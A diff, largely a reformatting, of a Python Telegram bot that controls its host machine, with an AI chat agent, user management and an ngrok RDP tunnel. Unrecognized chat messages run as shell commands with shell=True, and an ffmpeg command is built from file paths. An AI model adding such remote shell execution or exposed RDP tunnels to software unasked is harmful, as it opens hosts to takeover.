+                "prediction": self.nlp_model.classes_.tolist()[predictons.argmax()],
+            }
+            await context.bot.send_message(
+                chat_id=chat_id,
+                text=self._commmand_confrimation_msg[
+                    self.nlp_model.classes_.tolist()[predictons.argmax()]
+                ],
+                reply_markup=self.keyboard,
+            )
         else:
-            await self.command_handlers[self.nlp_model.classes_.tolist()[predictons.argmax()]](
-                chat_id, command, list_command, first_name, last_name, context)
+            await self.command_handlers[
+                self.nlp_model.classes_.tolist()[predictons.argmax()]
+            ](chat_id, command, list_command, first_name, last_name, context)
 
-    async def execute_chat_command_async(self, chat_id, command, list_command, first_name, last_name, context, reply=False, is_audio=False):
+    async def execute_chat_command_async(
+        self,
+        chat_id,
+        command,
+        list_command,
+        first_name,
+        last_name,
+        context,
+        reply=False,
+        is_audio=False,
+    ):
         """
         Executes a chat command based on the given command and list of command arguments.
 
@@ -751,9 +1065,10 @@ here is log''')
         Returns:
             None
         """
-        print('execute_chat_command', command,
-              list_command, first_name, last_name, reply)
-        if command.startswith('>'):
+        print(
+            "execute_chat_command", command, list_command, first_name, last_name, reply
+        )
+        if command.startswith(">"):
             command = command[1:]
             list_command[0] = list_command[0][1:]
             reply = True
@@ -765,29 +1080,36 @@ here is log''')
             reply = True
         if not reply:
             await self.retrieve_command_predictions_async(
-                chat_id, command, list_command, first_name, last_name, context)
+                chat_id, command, list_command, first_name, last_name, context
+            )
             return
         cmd = list_command[0].lower()
 
-        if self.chat_mode.get(chat_id) == 'ai':
-            await self.command_handlers['chat'](
-                chat_id, command, list_command, first_name, last_name, context, is_audio=is_audio)
+        if self.chat_mode.get(chat_id) == "ai":
+            await self.command_handlers["chat"](
+                chat_id,
+                command,
+                list_command,
+                first_name,
+                last_name,
+                context,
+                is_audio=is_audio,
+            )
         elif cmd in self.command_handlers:
             await self.command_handlers[cmd](
-                chat_id, command, list_command, first_name, last_name, context)
+                chat_id, command, list_command, first_name, last_name, context
+            )
         elif chat_id == self.chat_id_file and cmd == self.random_f:
             await self.save_file_in_fin(chat_id)
         else:
-            print('Executing as shell command')
-            process = Popen(command, shell=True,
-                            stdout=PIPE, stderr=PIPE, text=True)
+            print("Executing as shell command")
+            process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, text=True)
             stdout, _ = process.communicate()
             if process.returncode != 0:
-                await context.bot.send_message(
-                    chat_id=chat_id, text="INVALID Command")
+                await context.bot.send_message(chat_id=chat_id, text="INVALID Command")
             else:
                 await context.bot.send_message(chat_id=chat_id, text=stdout)
-                await context.bot.send_message(chat_id=chat_id, text='ok')
+                await context.bot.send_message(chat_id=chat_id, text="ok")
 
     async def reply_button_async(self, msg, context):
         """
@@ -800,22 +1122,39 @@ here is log''')
         Returns:
             None
         """
-        query_data = msg['data']
-        chat_id = msg['message']['chat']['id']
-        first_name = msg['message']['chat']['first_name']
-        last_name = msg['message']['chat']['last_name']
-        if query_data == 'yes':
-            command = self.nlp_classifier_output[chat_id]['command']
+        query_data = msg["data"]
+        chat_id = msg["message"]["chat"]["id"]
+        first_name = msg["message"]["chat"]["first_name"]
+        last_name = msg["message"]["chat"]["last_name"]
+        if query_data == "yes":
+            command = self.nlp_classifier_output[chat_id]["command"]
             list_command = command.split()
-            await self.command_handlers[self.nlp_classifier_output[chat_id]['prediction']](
-                chat_id, command, list_command, first_name, last_name, context)
+            await self.command_handlers[
+                self.nlp_classifier_output[chat_id]["prediction"]
+            ](chat_id, command, list_command, first_name, last_name, context)
             self.nlp_classifier_output[chat_id] = {}
-        elif query_data == 'no':
-            await self.execute_chat_command_async(chat_id, self.nlp_classifier_output[chat_id]['command'], self.nlp_classifier_output[chat_id]['command'].split(
-            ), first_name, last_name, context, reply=True)
+        elif query_data == "no":
+            await self.execute_chat_command_async(
+                chat_id,
+                self.nlp_classifier_output[chat_id]["command"],
+                self.nlp_classifier_output[chat_id]["command"].split(),
+                first_name,
+                last_name,
+                context,
+                reply=True,
+            )
             self.nlp_classifier_output[chat_id] = {}
 
-    async def run_language_model(self, chat_id, command, list_command, first_name, last_name, context, is_audio=False):
+    async def run_language_model(
+        self,
+        chat_id,
+        command,
+        list_command,
+        first_name,
+        last_name,
+        context,
+        is_audio=False,
+    ):
         """
         Runs a language model to generate a response based on the user's input.
 
@@ -836,13 +1175,20 @@ here is log''')
         """
         if self.chat_bot_enabled == False:
             await context.bot.send_message(
-                chat_id=chat_id, text="Chat bot is disabled. Please enable it to use this feature.")
+                chat_id=chat_id,
+                text="Chat bot is disabled. Please enable it to use this feature.",
+            )
             return
         user_name = f"{first_name} {last_name}"
         promptn = f"{user_name} says: {command if self.get_chat_mode(chat_id) == 'ai' else ' '.join(list_command[1:])}"
-        system_status = await self.get_system_status(chat_id, command, list_command, first_name, last_name, context, True)
-        tool_ctx = ToolContext(
-            chat_id, first_name, last_name, context)
+        print("Prompt:", promptn)
+        print(
+            user_name, command, list_command, first_name, last_name, context, is_audio
+        )
+        system_status = await self.get_system_status(
+            chat_id, command, list_command, first_name, last_name, context, True
+        )
+        tool_ctx = ToolContext(chat_id, first_name, last_name, context)
         chat_history = []
         if len(self.get_chat_history(chat_id)) == 0:
             chat_history.append(agent_system_prompt)
@@ -850,81 +1196,111 @@ here is log''')
             chat_history = self.get_chat_history(chat_id)
 
         if not is_audio:
-         
 
-            agent = create_agent_text(
-                self, tool_ctx
+            agent = create_agent_text(self, tool_ctx)
+            print("Generating text response...###################################")
+            agent_response = await agent.ainvoke(
+                {
+                    "user_name": user_name,
+                    "user_input": promptn,
+                    "history": chat_history,
+                    "system_status": system_status,
+                }
             )
 
-           
-            agent_response = await agent.ainvoke({
-                "user_name": user_name,
-                "user_input": promptn,
-                "history": chat_history,
-                "system_status": system_status
-            })
-
-            response = agent_response['output']
+            response = agent_response["output"]
             response = response_formatter_chain.invoke({"response": response})
             print(agent_response)
             print("Generated text response:", response)
-            if (self.clear_history_flag.get(chat_id, False)):
+            if self.clear_history_flag.get(chat_id, False):
                 self.chat_history[chat_id] = []
                 self.clear_history_flag[chat_id] = False
             else:
-                self.record_message(
-                    chat_id, agent_response['response']['messages'])
-            await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
+                self.record_message(chat_id, agent_response["response"]["messages"])
+            await context.bot.send_message(
+                chat_id=chat_id, text=response, parse_mode="Markdown"
+            )
         else:
             print("Generating audio response...")
             agent_tts = create_agent_tts(self, tool_ctx)
-            audio_file_paths, agent_response = await agent_tts.ainvoke({
-                "user_name": user_name,
-                "user_input": promptn,
-                "history": chat_history,
-                "system_status": system_status
-
-            })
+            audio_file_paths, agent_response = await agent_tts.ainvoke(
+                {
+                    "user_name": user_name,
+                    "user_input": promptn,
+                    "history": chat_history,
+                    "system_status": system_status,
+                }
+            )
             print(agent_response)
 
-            response = agent_response['output']
+            response = agent_response["output"]
             response = response_formatter_chain.invoke({"response": response})
             # ttsChain returns wav file path
             # convert wav to ogg
             for audio_file_path in audio_file_paths:
-                convert_command = f'{self.ffmpeg_path_prefix}ffmpeg -y -i downloads/{audio_file_path} downloads/{audio_file_path}.ogg'
-                process = Popen(convert_command, shell=True,
-                                stdout=PIPE, stderr=PIPE, text=True)
+                convert_command = f"{self.ffmpeg_path_prefix}ffmpeg -y -i downloads/{audio_file_path} downloads/{audio_file_path}.ogg"
+                process = Popen(
+                    convert_command, shell=True, stdout=PIPE, stderr=PIPE, text=True
+                )
                 stdout, stderr = process.communicate()
                 if process.returncode != 0:
                     await context.bot.send_message(
-                        chat_id=chat_id, text="Error converting audio file.")
+                        chat_id=chat_id, text="Error converting audio file."
+                    )
                 elif len(audio_file_paths) == 1:
                     try:
-                        await context.bot.send_audio(chat_id=chat_id, audio=f'downloads/{audio_file_path}.ogg', caption=response, parse_mode='Markdown')
+                        await context.bot.send_audio(
+                            chat_id=chat_id,
+                            audio=f"downloads/{audio_file_path}.ogg",
+                            caption=response,
+                            parse_mode="Markdown",
+                        )
                     except BaseException as e:
-                        if (isinstance(e, telegram.error.BadRequest) and 'Message caption is too long' in str(e)) or 'Can\'t parse entities' in str(e):
-                            await context.bot.send_voice(chat_id=chat_id, voice=open(f'downloads/{audio_file_path}.ogg', 'rb'))
-                            await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
+                        if (
+                            isinstance(e, telegram.error.BadRequest)
+                            and "Message caption is too long" in str(e)
+                        ) or "Can't parse entities" in str(e):
+                            await context.bot.send_voice(
+                                chat_id=chat_id,
+                                voice=open(f"downloads/{audio_file_path}.ogg", "rb"),
+                            )
+                            await context.bot.send_message(
+                                chat_id=chat_id, text=response, parse_mode="Markdown"
+                            )
                         else:
                             try:
-                                await context.bot.send_voice(chat_id=chat_id, voice=open(f'downloads/{audio_file_path}.ogg', 'rb'))
-                                await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
+                                await context.bot.send_voice(
+                                    chat_id=chat_id,
+                                    voice=open(
+                                        f"downloads/{audio_file_path}.ogg", "rb"
+                                    ),
+                                )
+                                await context.bot.send_message(
+                                    chat_id=chat_id,
+                                    text=response,
+                                    parse_mode="Markdown",
+                                )
                             except BaseException as e:
-                                await context.bot.send_message(chat_id=chat_id, text="Error sending audio file.")
-                    os.remove(f'downloads/{audio_file_path}.ogg')
-                os.remove(f'downloads/{audio_file_path}')
-            if (len(audio_file_paths) > 1):
+                                await context.bot.send_message(
+                                    chat_id=chat_id, text="Error sending audio file."
+                                )
+                    os.remove(f"downloads/{audio_file_path}.ogg")
+                os.remove(f"downloads/{audio_file_path}")
+            if len(audio_file_paths) > 1:
                 for audio_file_path in audio_file_paths:
-                    await context.bot.send_voice(chat_id=chat_id, voice=open(f'downloads/{audio_file_path}.ogg', 'rb'))
-                    os.remove(f'downloads/{audio_file_path}.ogg')
-                await context.bot.send_message(chat_id=chat_id, text=response, parse_mode='Markdown')
-            if (self.clear_history_flag.get(chat_id, False)):
+                    await context.bot.send_voice(
+                        chat_id=chat_id,
+                        voice=open(f"downloads/{audio_file_path}.ogg", "rb"),
+                    )
+                    os.remove(f"downloads/{audio_file_path}.ogg")
+                await context.bot.send_message(
+                    chat_id=chat_id, text=response, parse_mode="Markdown"
+                )
+            if self.clear_history_flag.get(chat_id, False):
                 self.chat_history[chat_id] = []
                 self.clear_history_flag[chat_id] = False
             else:
-                self.record_message(
-                    chat_id, agent_response['response']['messages'])
+                self.record_message(chat_id, agent_response["response"]["messages"])
 
     def escape_markdown_v2(self, text):
         """
@@ -936,12 +1312,14 @@ here is log''')
         Returns:
             str: The escaped text.
         """
-        special_chars = r'_*[]()~`>#+-=|{}.!'
+        special_chars = r"_*[]()~`>#+-=|{}.!"
         for char in special_chars:
-            text = text.replace(char, f'\\{char}')
+            text = text.replace(char, f"\\{char}")
         return text
 
-    async def list_users(self, chat_id, command, list_command, first_name, last_name, context):
+    async def list_users(
+        self, chat_id, command, list_command, first_name, last_name, context
+    ):
         """
         Lists all authorized users and sends the list to the requesting user.
 
@@ -952,23 +1330,32 @@ here is log''')
         Returns:
             None
         """
-        if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
+        if not (
+            str(chat_id).startswith(self.admin_chat_id)
+            and str(chat_id).endswith(self.admin_chat_id)
+        ):
             await context.bot.send_message(
-                chat_id=chat_id, text=self.un_authorized_message)
+                chat_id=chat_id, text=self.un_authorized_message
+            )
             return self.un_authorized_message
         users_available = False
         user_list = "Authorized Users:\n"
-        for user in self.auth_list['authorized']:
-            if user['chat_id'] is None or user['chat_id'] == int(self.admin_chat_id):
+        for user in self.auth_list["authorized"]:
+            if user["chat_id"] is None or user["chat_id"] == int(self.admin_chat_id):
                 continue
-            escaped_name = self.escape_markdown_v2(user['Name'])
+            escaped_name = self.escape_markdown_v2(user["Name"])
             user_list += f"Name: '''{escaped_name}''', Chat ID:`{user['chat_id']}`\n"
             users_available = True
         await context.bot.send_message(
-            chat_id=chat_id, text=user_list if users_available else 'No authorized users', parse_mode='MarkdownV2')
-        return 'list sent to user'
+            chat_id=chat_id,
+            text=user_list if users_available else "No authorized users",
+            parse_mode="MarkdownV2",
+        )
+        return "list sent to user"
 
-    async def kick_user(self, chat_id, command, list_command, first_name, last_name, context):
+    async def kick_user(
+        self, chat_id, command, list_command, first_name, last_name, context
+    ):
         """
         Removes a user from the authorized list and notifies them.
 
@@ -979,9 +1366,13 @@ here is log''')
         Returns:
             None
         """
-        if not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id)):
+        if not (
+            str(chat_id).startswith(self.admin_chat_id)
+            and str(chat_id).endswith(self.admin_chat_id)
+        ):
             await context.bot.send_message(
-                chat_id=chat_id, text=self.un_authorized_message)
+                chat_id=chat_id, text=self.un_authorized_message
+            )
             return self.un_authorized_message
         remove_chat_id = list_command[1] if len(list_command) > 1 else None
         if remove_chat_id and remove_chat_id.isdigit():
@@ -990,40 +1381,67 @@ here is log''')
             remove_chat_id = None
         if not remove_chat_id:
             await context.bot.send_message(
-                chat_id=chat_id, text="Please provide the chat ID of the user to remove.")
+                chat_id=chat_id,
+                text="Please provide the chat ID of the user to remove.",
+            )
             return "Please provide the chat ID of the user to remove."
         user_to_remove = next(
-            (user for user in self.auth_list['authorized'] if user['chat_id'] == remove_chat_id), None)
+            (
+                user
+                for user in self.auth_list["authorized"]
+                if user["chat_id"] == remove_chat_id
+            ),
+            None,
+        )
         if user_to_remove:
-            self.auth_list['authorized'].remove(user_to_remove)
-            async with aiofiles.open(self.authorzed_users, 'w') as f:
+            self.auth_list["authorized"].remove(user_to_remove)
+            async with aiofiles.open(self.authorzed_users, "w") as f:
                 await f.write(json.dumps(self.auth_list, indent=2))
             await context.bot.send_message(
-                chat_id=self.admin_chat_id, text=f"User {user_to_remove['Name']} has been kicked.")
+                chat_id=self.admin_chat_id,
+                text=f"User {user_to_remove['Name']} has been kicked.",
+            )
             return f"User {user_to_remove['Name']} has been kicked."
         else:
             await context.bot.send_message(
-                chat_id=self.admin_chat_id, text="User not found in the authorized list.")
+                chat_id=self.admin_chat_id,
+                text="User not found in the authorized list.",
+            )
             return "User not found in the authorized list."
 
-    async def start_stop_rdp_tunnel(self, chat_id, command, list_command, first_name, last_name, context):
+    async def start_stop_rdp_tunnel(
+        self, chat_id, command, list_command, first_name, last_name, context
+    ):
         # Set up ngrok tunnel
-        if (self.rdp_active):
+        if self.rdp_active:
             ngrok.kill()
             self.rdp_active = False
             await context.bot.send_message(chat_id=chat_id, text="RDP tunnel stopped")
-            if (not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id))):
+            if not (
+                str(chat_id).startswith(self.admin_chat_id)
+                and str(chat_id).endswith(self.admin_chat_id)
+            ):
                 await context.bot.send_message(
-                    chat_id=self.admin_chat_id, text=f'''RDP tunnel stopped by {first_name} {last_name}''')
+                    chat_id=self.admin_chat_id,
+                    text=f"""RDP tunnel stopped by {first_name} {last_name}""",
+                )
             return "RDP tunnel stopped"
-        elif (self.video_state):
+        elif self.video_state:
             await context.bot.send_message(
-                chat_id=chat_id, text="Cannot start RDP tunnel as other video feed is running on the server")
-            return "Cannot start RDP tunnel as other video feed is running on the server"
-        elif (self.screen_state):
+                chat_id=chat_id,
+                text="Cannot start RDP tunnel as other video feed is running on the server",
+            )
+            return (
+                "Cannot start RDP tunnel as other video feed is running on the server"
+            )
+        elif self.screen_state:
             await context.bot.send_message(
-                chat_id=chat_id, text="Cannot start RDP tunnel as other screen feed is running on the server")
-            return "Cannot start RDP tunnel as other screen feed is running on the server"
+                chat_id=chat_id,
+                text="Cannot start RDP tunnel as other screen feed is running on the server",
+            )
+            return (
+                "Cannot start RDP tunnel as other screen feed is running on the server"
+            )
         ngrok_tunnel = ngrok.connect(self.rdp_port, "tcp")
 
         self.rdp_active = True
@@ -1034,13 +1452,23 @@ here is log''')
         tunnel_ip = socket.gethostbyname(tunnel_domain)
         tunnel_port = ngrok_tunnel.public_url.split(":")[2]
         await context.bot.send_message(
-            chat_id=chat_id, text=f"RDP tunnel started at `{tunnel_ip}:{tunnel_port}`", parse_mode='MarkdownV2')
-        if (not (str(chat_id).startswith(self.admin_chat_id) and str(chat_id).endswith(self.admin_chat_id))):
+            chat_id=chat_id,
+            text=f"RDP tunnel started at `{tunnel_ip}:{tunnel_port}`",
+            parse_mode="MarkdownV2",
+        )
+        if not (
+            str(chat_id).startswith(self.admin_chat_id)
+            and str(chat_id).endswith(self.admin_chat_id)
+        ):
             await context.bot.send_message(
-                chat_id=self.admin_chat_id, text=f'''RDP tunnel started by {first_name} {last_name}''')
+                chat_id=self.admin_chat_id,
+                text=f"""RDP tunnel started by {first_name} {last_name}""",
+            )
         return f"RDP tunnel started at `{tunnel_ip}:{tunnel_port}`"
 
-    async def clear_history(self, chat_id, command, list_command, first_name, last_name, context):
+    async def clear_history(
+        self, chat_id, command, list_command, first_name, last_name, context
+    ):
         self.clear_history_flag[chat_id] = True
         await context.bot.send_message(chat_id=chat_id, text="Chat history cleared")
         return "Chat history cleared"
